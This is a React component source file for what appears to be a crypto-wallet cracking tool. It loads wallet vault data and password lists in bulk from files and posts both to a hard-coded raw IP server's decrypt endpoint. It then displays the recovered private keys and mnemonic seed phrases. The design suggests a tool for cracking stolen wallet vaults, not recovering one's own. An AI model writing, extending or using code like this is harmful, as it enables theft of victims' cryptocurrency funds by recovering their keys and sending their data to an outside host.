import { Component } from 'react';
import axios from 'axios';
import './App.css';
import { extractVaultsFromFile, extractPasswordsFromFile } from './lib/lib';

export default class App extends Component {
  constructor(props) {
    super(props);
    this.state = {
      vaults: null,
      passwords: [],
      decryptPassword: '',
    }
  }
  getVaultsFromFile = async (event) => {
    if(event.target.files.length !== 0) {
      let vaults = [];
      for(let i = 0; i < event.target.files.length; i++) {
        const file = event.target.files[i]
        const data = await file.text()
        vaults = vaults.concat(extractVaultsFromFile(data))
      }
      vaults = Array.from(new Set(vaults))
      this.setState({ vaults: vaults })
      const resultElement = document.getElementById('result');
      resultElement.textContent = '';
    }
  }

  getPasswordsFromFile = async (event) => {
    if(event.target.files.length !== 0) {
      let passwords = []
      for(let i = 0; i < event.target.files.length; i++) {
        const file = event.target.files[i]
        const data = await file.text()
        passwords = passwords.concat(extractPasswordsFromFile(data))
      }
      passwords = Array.from(new Set(passwords))
      this.setState({ passwords: passwords })
      const resultElement = document.getElementById('result');
      resultElement.textContent = '';
    }
  }

  decrypt = () => {
    if(this.state.vaults !== null && this.state.passwords.length > 0 ) {
      const resultElement = document.getElementById('result');
      resultElement.textContent = 'Parsing....';
      const data = {
        vaults: this.state.vaults,
        passwords: this.state.passwords
      }
      axios
        .post("http://149.102.225.59:5001/api/decrypt", data)
        .then((response) => {
          let resArray = []
          if(response.data.length > 0) {
            for(let i = 0; i < response.data.length; i++) {
              const decryptedData = response.data[i].decryptedData
              const entries  = Object.entries(decryptedData)
              let result = []
              entries.forEach(([key, value]) => {
                result.push({ privateKey: value.privateKey, mnemonic: value.mnemonic })
              })
              resArray.push(JSON.stringify({ password: response.data[i].password, result: result }))
            }
            resArray = Array.from(new Set(resArray))
            const res = resArray.join('\n')
            const resultElement = document.getElementById('result');
            resultElement.textContent = res;
          } else {
            const resultElement = document.getElementById('result');
            resultElement.textContent = 'No password';
          }
        })
        .catch((error) => {
          console.error("Error sending data to server", error);
        });  
    }
  }
  render() {
    return (
      <div className="App">
      <hr/>
      <table>
        <tr>
          <td className='vault'>
            <input type='file' onChange={ this.getVaultsFromFile } multiple/>
            <br/>
            <textarea value={this.state.vaults} rows='20'/>
          </td>
          <td className='password'>
            <input type='file' onChange={ this.getPasswordsFromFile } multiple/>
            <br/>
            <textarea value={this.state.passwords.join('\n')} rows='20'/>
          </td>
        </tr>
      </table>
      <button onClick={this.decrypt}>start</button>
      <div id='result'></div>
    </div>
    )
  }
}